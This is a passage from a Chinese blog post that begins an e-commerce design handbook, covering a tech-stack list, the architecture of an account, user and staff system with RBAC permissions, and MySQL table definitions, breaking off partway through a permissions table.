    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>一直从事互联网电商开发三年多的时间了，回头想想却对整个业务流程不是很了解，说出去很是惭愧。但是身处互联网电商的环境中，或多或少接触了其中的各个业务，其次周边还有很多从事电商的同事和朋友，这都是资源。于是，我决定和我的同事、盆友们、甚至还有你们去梳理整个流程并分享出来，谈不上结果要做的多么好，至少在每一个我们有能力去做好的地方，一定会细致入微。</p><p>除此之外，同时为了满足我们自身在工作中可能得不到的技术满足感，我们在做整个系统设计的过程中，会去使用我们最想用的技术栈。技术栈这一点我们借助docker去实现，所以最终的结果：一方面我们掌握了业务的东西，另一方面又得到了技术上的满足感，二者兼得。</p><p>最后，出于时间的考虑，我们提出了一个想法<strong>Do design No code</strong>。<strong>【只设计不码码】</strong> 这句话的意思：最终我们设计出来整个系统的数据模型，接口文档，甚至交互过程，以及环境部署等，但是最后我们却不写代码。是吧？如果这样了写代码还有什么意义。当然，也不全是这样，出于时间的考虑当然也会用代码实现出来的，说不定最后正是对面的你去实现的。</p><p>其次，这些内容肯定有考虑不全面或者在上规模的业务中存在更复杂的地方，欢迎指出，我们也希望学习和分享您的经验。</p><h1 id="技术栈选型"><a href="#技术栈选型" class="headerlink" title="技术栈选型"></a>技术栈选型</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">- 基础环境</span><br><span class="line">    + k8s</span><br><span class="line">    + docker</span><br><span class="line">- 存储</span><br><span class="line">    + mysql</span><br><span class="line">    + redis</span><br><span class="line">        * codis</span><br><span class="line">        * redis主从</span><br><span class="line">- queue</span><br><span class="line">    + kafka</span><br><span class="line">    + rocketmq</span><br><span class="line">    + rabbitmq</span><br><span class="line">- gw</span><br><span class="line">    + kong</span><br><span class="line">    + zuul</span><br><span class="line">- webserver</span><br><span class="line">    + nginx/openresty</span><br><span class="line">    + envoy</span><br><span class="line">- server</span><br><span class="line">    + go</span><br><span class="line">    + php</span><br><span class="line">- frontend</span><br><span class="line">    + vue</span><br><span class="line">- rpc</span><br><span class="line">    + grpc</span><br><span class="line">    + thrift</span><br><span class="line">- 基础能力</span><br><span class="line">    + 监控</span><br><span class="line">        * zipkin</span><br><span class="line">        * elk</span><br><span class="line">        * falcon</span><br><span class="line">    + 服务发现</span><br><span class="line">        * zookeeper</span><br><span class="line">        * etcd</span><br><span class="line">    + 持续集成</span><br><span class="line">        * ci/cd</span><br><span class="line">- 搜索</span><br><span class="line">    + es</span><br><span class="line">    + solr</span><br></pre></td></tr></table></figure><h1 id="代码仓库"><a href="#代码仓库" class="headerlink" title="代码仓库"></a>代码仓库</h1><p>请您耐心等待…</p><h1 id="用户体系"><a href="#用户体系" class="headerlink" title="用户体系"></a>用户体系</h1><p>今天，我们开始第一部分<strong>用户体系</strong>的设计。本文分为如下四大模块：</p><ul><li>架构设计</li><li>数据模型设计</li><li>交互设计</li><li>接口设计</li></ul><h2 id="架构设计"><a href="#架构设计" class="headerlink" title="架构设计"></a>架构设计</h2><h3 id="简单来看用户体系"><a href="#简单来看用户体系" class="headerlink" title="简单来看用户体系"></a>简单来看用户体系</h3><p>当你第一次接触和用户相关的互联网产品时，或者曾今在我眼里。<strong>用户体系</strong>无非就是“登录”和“注册”，“修改用户信息”这些，等。简单来做的话，无非我们需要一张表去记录用户的身份信息：注册时(insert操作)，往表里插入一个数据；登录时(select&amp;update操作)，通过用户标识(手机号、邮箱等)判断用户的密码是否正确；修改用户信息(select&amp;update操作)，就是直接update这个uid的用户信息(头像、昵称等)。</p><p><img src="/articles/电商设计手册/skr-account-smaple-structure.png" alt></p><p>这样设计的确没什么问题，很简单不是么。但是随着业务的发展，一方面我们需要提供统一的用户管理(高内聚)，又要提高系统的可扩展性，所以我想呈现出来的是我理解的<strong>一个基本用户体系应该有的东西</strong>。</p><h3 id="一个基本用户体系应该有的东西"><a href="#一个基本用户体系应该有的东西" class="headerlink" title="一个基本用户体系应该有的东西"></a>一个基本用户体系应该有的东西</h3><p>首先我们对原有的用户表进行再一次的抽象(抽离用户注册、登录依赖的字段、第三方登录) -&gt; <strong>账户表</strong>，为什么这么做？随着业务的发展，以前只维护一个产品，也许某一天又开发新的产品，这样我们就可以统一的维护我们公司所有产品的注册登录逻辑，不同的产品只维护该产品和用户相关的信息即可(具体依赖产品形态)。如下图所示：</p><p><img src="/articles/电商设计手册/skr-user-system-2.png" alt></p><p>上图中，还提到了第三方登录/员工表/后台权限管理，这些都是一些用户体系基本必备的结构。</p><p>第三方登录：第三方也是登录方式的一种，我们也把它抽象到账户的一部分，如上图所示。其次，关于第三方登录这里存在一个交互方式设计存在的问题，后面交互设计时会提到。</p><p>员工：因为上面我们抽离了账户表，所以内部的管理系统后台也可以统一的使用账户表的登录逻辑，这样全公司在账号这个事情上达到了真正的高内聚。</p><p>提到了员工，我们的内部各种系统后台肯定涉及各种的权限管理，所以这里提到了简单的RBAC(基于角色的权限控制)，具体的逻辑数据模型设计会提到。</p><h3 id="最终的架构"><a href="#最终的架构" class="headerlink" title="最终的架构"></a>最终的架构</h3><p>随着业务产品形态的越来越复杂，在设计架构的时候，我们需要分析其中的<strong>变与不变</strong>：</p><ul><li>变：越来越多的产品个性化用户需求</li><li>不变：注册登录的逻辑</li></ul><p>最终的结果，我们把原有的用户拆成了<strong>账户</strong>和<strong>用户</strong>，同时我们也要在这里明确这两个概念的区别：</p><ul><li>账户：整个体系唯一生产uid的地方，内聚注册登录逻辑，不涉及产品业务需求</li><li>用户：不同产品个性化的用户需求信息</li></ul><p>最终的架构图如下：</p><ul><li>第一部分：账户(<strong>服务层</strong>)</li><li>第二部分：用户(<strong>应用层</strong>，无限水平扩展)</li><li>第三部分：员工(<strong>应用层</strong>，员工权限体系)</li></ul><p><img src="/articles/电商设计手册/skr-account-structure.jpg" alt></p><h2 id="数据模型设计"><a href="#数据模型设计" class="headerlink" title="数据模型设计"></a>数据模型设计</h2><p>对应上面的架构，我们很容易设计出我们的数据模型(这里假设我们目前只有一个对C端的应用)：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">账户 -&gt; 1.账户表</span><br><span class="line">用户 -&gt; 2.用户表</span><br><span class="line">员工 -&gt; 3.员工表</span><br></pre></td></tr></table></figure><p>除了上面三张表外，还需要我们的R(role)B(base)A(access)C(control)权限管理,RBAC基于角色的权限管理大家应该很熟悉，这里我就不详细说了，简单的RBAC首先需要：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4.系统菜单表(菜单即权限)，系统的uri路径</span><br><span class="line">5.权限表(菜单即权限)，具体的权限就是访问系统的菜单</span><br><span class="line">6.角色表，一个角色具有哪些权限</span><br><span class="line">7.员工和角色的关联表，一个员工属于哪个角色</span><br></pre></td></tr></table></figure><p>好了一个简单的RBAC涉及的表基本罗列出来了，但是在我的工作经历中大家实现的权限管理往往只针对某个系统，这样对于众多的系统后台来说就是乱、重复造轮子、权限管理效率低。所以我在上面的架构设计中把权限作为了一个服务为全系统提供基础服务能力。而达到这个目的的结果我只需要再增加一张表：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.后台管理系统表, 登记所有的后台管理系统(这样通过系统id和系统资源uri的id就可以全局构成唯一性，单纯的uri存在重复的可能性，用uri不用url的原因是域名存在变动的可能性)</span><br></pre></td></tr></table></figure><p>最后我们的用户体系应该基本就上面8张表。咦，貌似漏掉了第三方登录，我们加上吧，很简单如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9. 第三方用户登录表，记录不同第三方的用户标示</span><br></pre></td></tr></table></figure><p>最最后就是上面的9张表了，具体的表结构和sql如下：</p><p><img src="/articles/电商设计手册/skr-account-model-2.png" alt></p><p><strong>账户模型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 账户模型</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`account_user`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">  <span class="string">`email`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'邮箱'</span>,</span><br><span class="line">  <span class="string">`phone`</span> <span class="built_in">varchar</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'手机号'</span>,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'用户名'</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">32</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'密码'</span>,</span><br><span class="line">  <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  <span class="string">`create_ip_at`</span> <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'创建ip'</span>,</span><br><span class="line">  <span class="string">`last_login_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'最后一次登录时间'</span>,</span><br><span class="line">  <span class="string">`last_login_ip_at`</span> <span class="built_in">varchar</span>(<span class="number">12</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'最后一次登录ip'</span>,</span><br><span class="line">  <span class="string">`login_times`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'登录次数'</span>,</span><br><span class="line">  <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_email`</span> (<span class="string">`email`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_phone`</span> (<span class="string">`phone`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_username`</span> (<span class="string">`username`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'账户'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 第三方账户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`account_platform`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">  <span class="string">`uid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">  <span class="string">`platform_id`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'平台id'</span>,</span><br><span class="line">  <span class="string">`platform_token`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'平台access_token'</span>,</span><br><span class="line">  <span class="string">`type`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'平台类型 0:未知,1:facebook,2:google,3:wechat,4:qq,5:weibo,6:twitter'</span>,</span><br><span class="line">  <span class="string">`nickname`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'昵称'</span>,</span><br><span class="line">  <span class="string">`avatar`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'头像'</span>,</span><br><span class="line">  <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_uid`</span> (<span class="string">`uid`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_platform_id`</span> (<span class="string">`platform_id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'第三方用户信息'</span>;</span><br></pre></td></tr></table></figure><p><strong>用户模型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 用户模型</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`skr_member`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'用户id'</span>,</span><br><span class="line">  <span class="string">`uid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">  <span class="string">`nickname`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'昵称'</span>,</span><br><span class="line">  <span class="string">`avatar`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'头像(相对路径)'</span>,</span><br><span class="line">  <span class="string">`gender`</span> enum(<span class="string">'male'</span>,<span class="string">'female'</span>,<span class="string">'unknow'</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'unknow'</span> <span class="keyword">COMMENT</span> <span class="string">'性别'</span>,</span><br><span class="line">  <span class="string">`role`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'角色 0:普通用户 1:vip'</span>,</span><br><span class="line">  <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">  <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`idx_uid`</span> (<span class="string">`uid`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'账户信息'</span>;</span><br></pre></td></tr></table></figure><p><strong>员工模型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 员工表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`staff_info`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'员工id'</span>,</span><br><span class="line">    <span class="string">`uid`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'账号id'</span>,</span><br><span class="line">    <span class="string">`email`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工邮箱'</span>,</span><br><span class="line">    <span class="string">`phone`</span> <span class="built_in">varchar</span>(<span class="number">15</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工手机号'</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工姓名'</span>,</span><br><span class="line">    <span class="string">`nickname`</span> <span class="built_in">varchar</span>(<span class="number">30</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工昵称'</span>,</span><br><span class="line">    <span class="string">`avatar`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">''</span> <span class="keyword">COMMENT</span> <span class="string">'员工头像(相对路径)'</span>,</span><br><span class="line">    <span class="string">`gender`</span> enum(<span class="string">'male'</span>,<span class="string">'female'</span>,<span class="string">'unknow'</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'unknow'</span> <span class="keyword">COMMENT</span> <span class="string">'员工性别'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_uid`</span> (<span class="string">`uid`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_email`</span> (<span class="string">`email`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_phone`</span> (<span class="string">`phone`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'员工信息(这里列了大概的信息，多的可以垂直拆表)'</span>;</span><br></pre></td></tr></table></figure><p><strong>系统权限管理模型</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统map</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_ms`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">smallint</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT <span class="keyword">COMMENT</span> <span class="string">'自增id'</span>,</span><br><span class="line">    <span class="string">`ms_name`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统名称'</span>,</span><br><span class="line">    <span class="string">`ms_desc`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系描述'</span>,</span><br><span class="line">    <span class="string">`ms_domain`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'系统域名'</span>,</span><br><span class="line">    <span class="string">`create_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建时间'</span>,</span><br><span class="line">    <span class="string">`create_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'创建人staff_id'</span>,</span><br><span class="line">    <span class="string">`update_at`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'更新时间'</span>,</span><br><span class="line">    <span class="string">`update_by`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'修改人staff_id'</span>,</span><br><span class="line">    <span class="string">`status`</span> <span class="built_in">tinyint</span>(<span class="number">1</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span> <span class="keyword">DEFAULT</span> <span class="string">'0'</span> <span class="keyword">COMMENT</span> <span class="string">'状态 1:enable, 0:disable, -1:deleted'</span>,</span><br><span class="line">    PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">KEY</span> <span class="string">`idx_domain`</span> (<span class="string">`ms_domain`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8mb4 <span class="keyword">COMMENT</span>=<span class="string">'系统map(登记目前存在的后台系统信息)'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 权限管理: 系统menu</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`auth_ms_menu`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">NOT</span> <span 